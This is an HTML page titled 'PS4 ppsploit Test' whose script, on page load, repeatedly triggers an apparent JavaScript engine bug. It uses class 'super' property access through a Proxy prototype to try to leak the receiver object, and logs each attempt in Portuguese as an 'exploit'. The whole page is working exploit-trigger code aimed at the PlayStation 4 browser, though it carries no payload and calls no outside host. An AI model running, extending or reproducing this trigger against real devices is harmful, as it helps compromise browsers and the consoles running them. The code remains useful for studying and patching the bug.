<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PS4 ppsploit Test</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #0f0;
      font-family: monospace;
      font-size: 14px;
    }
    #progress {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      padding: 4px;
      background: rgba(0,0,0,0.8);
      z-index: 1000;
    }
    #logs {
      position: absolute;
      top: 24px;
      left: 0;
      right: 0;
      bottom: 0;
      overflow-y: scroll;
      padding: 8px;
      white-space: pre-wrap;
      box-sizing: border-box;
    }
  </style>
</head>
<body>
  <div id="progress">Progresso: 0%</div>
  <div id="logs"></div>

  <script>
    const MAX_ITERATIONS = 100000;
    const LOG_INTERVAL = 100;

    // Sleep helper
    function sleep(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }

    function log(msg, isError = false) {
      const logs = document.getElementById('logs');
      const time = new Date().toISOString().split('T')[1];
      const line = `[${time}] ${msg}\n`;
      if (isError) console.error(msg);
      else console.log(msg);
      logs.textContent += line;
      logs.scrollTop = logs.scrollHeight;
    }

    function updateProgress(i) {
      const pct = ((i / MAX_ITERATIONS) * 100).toFixed(2);
      document.getElementById('progress').textContent = `Progresso: ${pct}%`;
    }

    function assert(cond, label) {
      if (!cond) {
        log(`[FALHA] ${label}`, true);
        return false;
      }
      log(`[SUCESSO] ${label}`);
      return true;
    }

    async function runExploit() {
      log('Iniciando exploit ppsploit...');
      for (let i = 0; i < MAX_ITERATIONS; i++) {
        try {
          let r1 = (() => {
            class Leaker1 { leak() { return super.foo; } }
            Leaker1.prototype.__proto__ = new Proxy({}, { get(t, p, r) { return r; } });
            return Leaker1.prototype.leak();
          })();
          assert(r1 === undefined, `GetById #${i}: ${r1}`);
        } catch (e) {
          log(`[ERRO] GetById #${i}: ${e}`, true);
        }

        try {
          let r2 = (() => {
            class Leaker2 { leak() { return super[Math.random() < 0.5 ? 'foo' : 'bar']; } }
            Leaker2.prototype.__proto__ = new Proxy({}, { get(t, p, r) { return r; } });
            return Leaker2.prototype.leak();
          })();
          assert(r2 === undefined, `GetByVal #${i}: ${r2}`);
        } catch (e) {
          log(`[ERRO] GetByVal #${i}: ${e}`, true);
        }

        try {
          let r3;
          (() => {
            let recv;
            class Leaker3 { leak() { super.foo = {}; return recv; } }
            Leaker3.prototype.__proto__ = new Proxy({}, { set(t, p, v, r) { recv = r; return true; } });
            r3 = new Leaker3().leak();
          })();
          assert(r3 === undefined, `SetById #${i}: ${r3}`);
        } catch (e) {
          log(`[ERRO] SetById #${i}: ${e}`, true);
        }

        try {
          let r4;
          (() => {
            let recv;
            class Leaker4 { leak() { super[Math.random() < 0.5 ? 'foo' : 'bar'] = {}; return recv; } }
            Leaker4.prototype.__proto__ = new Proxy({}, { set(t, p, v, r) { recv = r; return true; } });
            r4 = new Leaker4().leak();
          })();
          assert(r4 === undefined, `SetByVal #${i}: ${r4}`);
        } catch (e) {
          log(`[ERRO] SetByVal #${i}: ${e}`, true);
        }

        if (i % LOG_INTERVAL === 0) {
          updateProgress(i);
          // yield to event loop
          await sleep(0);
        }
      }
      log('Teste completo!');
    }

    window.addEventListener('load', () => {
      runExploit().catch(err => log(`Erro global: ${err}`, true));
    });
  </script>
</body>
</html>
